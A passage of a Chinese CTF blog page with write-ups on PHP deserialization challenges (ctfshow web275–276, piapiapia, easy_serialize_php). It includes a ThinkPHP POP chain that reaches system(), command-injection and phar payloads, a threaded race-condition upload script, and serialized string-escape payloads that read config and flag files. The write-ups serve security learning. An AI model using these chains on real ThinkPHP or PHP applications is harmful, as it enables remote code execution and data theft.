+// 表单ajax伪装变量
+            &#39;var_ajax&#39;         =&gt; &#39;_ajax&#39;,
+// 表单pjax伪装变量
+            &#39;var_pjax&#39;         =&gt; &#39;_pjax&#39;,
+// PATHINFO变量名 用于兼容模式
+            &#39;var_pathinfo&#39;     =&gt; &#39;s&#39;,
+// 兼容PATH_INFO获取
+            &#39;pathinfo_fetch&#39;   =&gt; [&#39;ORIG_PATH_INFO&#39;, &#39;REDIRECT_PATH_INFO&#39;, &#39;REDIRECT_URL&#39;],
+// 默认全局过滤方法 用逗号分隔多个
+            &#39;default_filter&#39;   =&gt; &#39;&#39;,
+// 域名根，如thinkphp.cn
+            &#39;url_domain_root&#39;  =&gt; &#39;&#39;,
+// HTTPS代理标识
+            &#39;https_agent_name&#39; =&gt; &#39;&#39;,
+// IP代理获取标识
+            &#39;http_agent_ip&#39;    =&gt; &#39;HTTP_X_REAL_IP&#39;,
+// URL伪静态后缀
+            &#39;url_html_suffix&#39;  =&gt; &#39;html&#39;,
+        ];
+        function __construct()&#123;
+            $this-&gt;filter = &quot;system&quot;;
+            $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#39;&#39;];
+            $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];
+        &#125;
+    &#125;
+    namespace think\process\pipes;
+    use think\model\concern\Conversion;
+    use think\model\Pivot;
+    class Windows &#123;
+        private $files = [];
+        public function __construct() &#123;
+            $this-&gt;files=[new Pivot()];
+        &#125;
+    &#125;
+    namespace think\model;
+    use think\Model;
+    class Pivot extends Model&#123;
+    &#125;
+    use think\process\pipes\Windows;
+    echo base64_encode(serialize(new Windows()));
+</code></pre>
+</li>
+<li><p>传参的时候需要注意，除了要传data还要传一个上边代码标注的地方，内容是要执行的代码</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web275-拼接rce"><a href="#web275-拼接rce" class="headerlink" title="web275-拼接rce"></a>web275-拼接rce</h3><blockquote>
+<ul>
+<li><p><code>__destruct</code>方法里有这么一句：<code>system(&#39;rm &#39;.$this-&gt;filename);</code>，可以拼接命令</p>
+</li>
+<li><p>因此要让<code>evilfile</code>的值为true，两个条件：</p>
+<pre><code class="php">public function checkevil()&#123;
+        if(preg_match(&#39;/php|\.\./i&#39;, $this-&gt;filename))&#123;
+            $this-&gt;evilfile=true;
+        &#125;
+        if(preg_match(&#39;/flag/i&#39;, $this-&gt;filecontent))&#123;
+            $this-&gt;evilfile=true;
+        &#125;
+        return $this-&gt;evilfile;
+</code></pre>
+</li>
+<li><p>payload：<code>?fn=1.php;cat flag.php</code>，然后post一个<code>php</code>或<code>flag</code></p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web276-phar-条件竞争"><a href="#web276-phar-条件竞争" class="headerlink" title="web276-phar+条件竞争"></a>web276-phar+条件竞争</h3><blockquote>
+<ul>
+<li><p>需要写脚本多线程上传文件，思路和上一题差不多，让admin和evilfile值为true，就可以拼接执行命令</p>
+</li>
+<li><p>脚本思路：</p>
+<ul>
+<li><p>首先需要制作phar包，然后上传文件，在被删除之前实现反序列化并执行命令</p>
+<pre><code class="php">&lt;?php
+    class filter&#123;
+        public $filename = &#39;1.php;cat f*&#39;;
+        public $evilfile=true;
+        public $admin = true;
+    &#125;
+    $phar=new phar(&#39;1.phar&#39;);
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);
+    $obj=new filter();
+    $phar-&gt;setMetadata($obj);
+    $phar-&gt;addFromString(&quot;1.txt&quot;,&quot;hao ye!&quot;);
+    $phar-&gt;stopBuffering();
+</code></pre>
+</li>
+<li><p>获取回显并判断是否包含flag</p>
+</li>
+<li><p>定义两个线程执行上传和读取操作</p>
+</li>
+</ul>
+</li>
+<li><p>脚本：</p>
+<pre><code class="python">import requests
+import threading
+
+u = &quot;http://ddd0d11f-a001-4dbd-9ec8-53fee7cc757d.challenge.ctf.show/&quot;
+f = open(&quot;1.phar&quot;, &#39;rb&#39;).read()
+
+
+def upload():
+    requests.post(url=u + &quot;?fn=1.phar&quot;, data=f)
+
+
+def execute():
+    r = requests.post(url=u + &quot;?fn=phar://1.phar/&quot;, data=&quot;&quot;)
+    if &quot;ctfshow&#123;&quot; in r.text:
+        print(r.text)
+        exit()
+
+
+while 1:
+    threading.Thread(target=upload()).start()
+    threading.Thread(target=execute()).start()
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<h2 id="BUU-反序列化"><a href="#BUU-反序列化" class="headerlink" title="BUU-反序列化"></a>BUU-反序列化</h2><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><blockquote>
+<ul>
+<li><p>打开是一个登录页面，试了几个密码都登不进去，试了一下<a target="_blank" rel="noopener" href="http://www.zip,成功下载源码/">www.zip，成功下载源码</a></p>
+</li>
+<li><p>可以发现有一个register.php。访问，随便注册一个账号登进去，可以看到有一个修改信息和上传图片的页面</p>
+</li>
+<li><p>研究源码吧</p>
+</li>
+<li><p>首先可以profile.php里找到一个<code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code></p>
+</li>
+<li><p>然后继续找，在upload.php里：<code>if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)</code>，这里可以使用数组绕过</p>
+</li>
+<li><p>继续，可以在class.php里看到这么一段：</p>
+<pre><code class="php">public function update_profile($username, $new_profile) &#123;
+        $username = parent::filter($username);
+        $new_profile = parent::filter($new_profile);
+
+        $where = &quot;username = &#39;$username&#39;&quot;;
+        return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
+    &#125;
+</code></pre>
+</li>
+<li><p>继续跟进到<code>filter</code>方法：</p>
+<pre><code class="php">public function filter($string) &#123;
+        $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
+        $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;
+        $string = preg_replace($escape, &#39;_&#39;, $string);
+
+        $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
+        $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;
+        return preg_replace($safe, &#39;hacker&#39;, $string);
+    &#125;
+</code></pre>
+</li>
+<li><p>可以发现可以构造字符串逃逸，因此思路就是，传入一个<code>nickname</code>，让它反序列化后输出<code>config.php</code></p>
+</li>
+<li><p>这里有一个需要注意的就是，因为把nickname改成了字符型，所以后边的字符串要多一个<code>&#125;</code></p>
+<pre><code class="txt">payload:
+wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;
+</code></pre>
+</li>
+<li><p>来，看笑话</p>
+<img src="images\image-20220827222917840.png" alt="image-20220827222917840" style="zoom:80%;" /></li>
+<li><p>我说呢我说呢我说呢怎么个事呢</p>
+</li>
+<li><p>f12找到base64编码后的字符串，去解码，得到flag</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><blockquote>
+<ul>
+<li><p>可以直接看源码，这里写了一句：</p>
+<pre><code class="php">eval(&#39;phpinfo();&#39;); //maybe you can find something in here!
+</code></pre>
+</li>
+<li><p>传参<code>?f=phpinfo</code>，找到了一个看起来很可疑的文件——d0g3_f1ag.php</p>
+</li>
+<li><p>这个题看起来比上一个简单一点，也是字符串逃逸，但是是缩短的</p>
+</li>
+<li><p><code>extract($_POST);</code>，这里有一个变量覆盖，可以通过post传参，覆盖掉之前的session参数</p>
+<pre><code class="txt">payload:
+_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;aa&quot;;s:2:&quot;bb&quot;;&#125;
+</code></pre>
+</li>
+<li><p>查看源码可以看到：<code>$flag = &#39;flag in /d0g3_fllllllag&#39;;</code>，把<code>/d0g3_fllllllag</code>进行base64编码然后替换掉</p>
+<pre><code class="txt">payload:
+_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;aa&quot;;s:2:&quot;bb&quot;;&#125;
+</code></pre>
+</li>
+<li><p>得到flag</p>
+</li>
+</ul>
+</blockquote>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2022 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1" ></canvas> 
+    <script src="/js/1.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;"></canvas>
+    <script type="text/javascript" src="/js/aixin.js"></script>
+    <script type="text/javascript" src="/js/anime.min.js"></script>
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
